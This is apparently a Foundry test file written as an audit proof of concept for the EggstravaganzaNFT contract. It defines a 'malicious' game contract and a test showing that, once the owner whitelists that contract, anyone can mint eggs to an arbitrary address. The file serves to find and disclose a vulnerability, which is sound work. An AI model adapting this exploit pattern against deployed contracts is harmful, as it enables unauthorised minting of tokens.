// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import "../src/EggstravaganzaNFT.sol";

/*//////////////////////////////////////////////////////////////
            PoC: MALICIOUS CONTRACT CAN MINT EGGS
//////////////////////////////////////////////////////////////*/

contract MaliciousGameContract {
    EggstravaganzaNFT public egg;

    constructor(address _egg) {
        egg = EggstravaganzaNFT(_egg);
    }

    function attack(address to, uint256 tokenId) external {
        // Mint an egg to any address
        egg.mintEgg(to, tokenId);
    }
}

/*//////////////////////////////////////////////////////////////
                PoC: Test MALICIOUS CONTRACT CAN MINT EGGS
//////////////////////////////////////////////////////////////*/

contract EggstravaganzaNFTTest is Test {
    EggstravaganzaNFT public egg;
    MaliciousGameContract public attacker;

    address public owner = address(0xABCD);
    address public victim = address(0xBEEF);

    function setUp() public {
        vm.startPrank(owner);
        egg = new EggstravaganzaNFT("Egg", "EGG");
        vm.stopPrank();
    }

    function test_MaliciousContractCanMintIfWhitelisted() public {
        // Simulate attacker deploying a malicious contract
        vm.startPrank(owner);
        attacker = new MaliciousGameContract(address(egg));

        // Owner sets malicious contract as the authorized game contract
        egg.setGameContract(address(attacker));
        vm.stopPrank();

        // Log total supply before the attack
        console.log("Total supply before attack:", egg.totalSupply());

        // Now anyone can use the malicious contract to mint an egg
        vm.startPrank(address(0xBAD));
        attacker.attack(victim, 999);
        vm.stopPrank();

        // Assert that the egg was minted
        assertEq(egg.ownerOf(999), victim);
        assertEq(egg.totalSupply(), 1);

        // Console logs for proof
        console.log("Malicious game contract deployed at:", address(attacker));
        console.log("Victim address:", victim);
        console.log("Egg owner of tokenId 999:", egg.ownerOf(999));
        console.log("Total supply after attack:", egg.totalSupply());
    }
}
